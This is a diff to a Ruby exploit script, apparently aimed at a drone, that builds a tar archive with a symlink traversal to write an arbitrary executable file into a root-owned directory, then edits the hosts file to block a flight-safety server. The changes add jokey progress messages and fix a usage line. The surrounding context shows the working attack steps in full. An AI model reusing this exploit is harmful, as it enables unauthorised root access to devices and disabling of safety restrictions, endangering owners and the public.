@@ -78,7 +78,7 @@ if Gem.win_platform?
         File.open("c:\\Windows\\System32\\Drivers\\etc\\hosts.writetest", 'a')            
     rescue Errno::EACCES => e
         puts "You know nothing John Snow, Run as Administrator please! " + e.message
-        puts "Usage: runas /user:administrator ruby \"RedHerring.rb /data/.bin/grep grep\""
+        puts "Usage: runas /user:administrator \"ruby RedHerring.rb /data/.bin/grep grep\""
     end
 
 else
@@ -254,16 +254,21 @@ destdir = File.dirname(writepath)
 nastyfile = File.readlines(ARGV[1])
 nastyfile = nastyfile.join("")
 
+puts "Burning some 0day"
 system("rm -rf symlink Burning0day.txt fireworks.tar")
 system("echo 'get root... Thx for all the fish P0V' > Burning0day.txt")
+puts "Creating the tar file"
 system("tar cpf fireworks.tar Burning0day.txt")
+puts "Making the symlinks" 
 system("ln -s " + destdir + " symlink")
+puts "Adding the fireworks..."
 system("tar --append -f fireworks.tar symlink")
 system("rm -rf symlink")
 system("mkdir -p symlink")
 
 File.open("symlink/" + destfile , 'w') {|f| f.write(nastyfile) }
 system("chmod 755 " + "symlink/" + destfile )
+puts "Boom headshot!"
 system("tar --append -pf fireworks.tar symlink/" + destfile)
 
 # root@wm220_dz_ap0002_v1:/ # ls -al /data/thx_darksimpson.sh  
@@ -284,6 +289,8 @@ system("tar --append -pf fireworks.tar symlink/" + destfile)
 #127.0.0.1 server-52-84-64-153.ord51.r.cloudfront.net
 #127.0.0.1 server-54-192-27-106.mxp4.r.cloudfront.net
 #127.0.0.1 flight-staging.aasky.net
+
+puts "Begining to edit host file entries."
 
 if File.readlines("/etc/hosts").grep(/flysafe\.aasky\.net/).size > 0
   puts "Flysafe redirection already in hosts file\n"
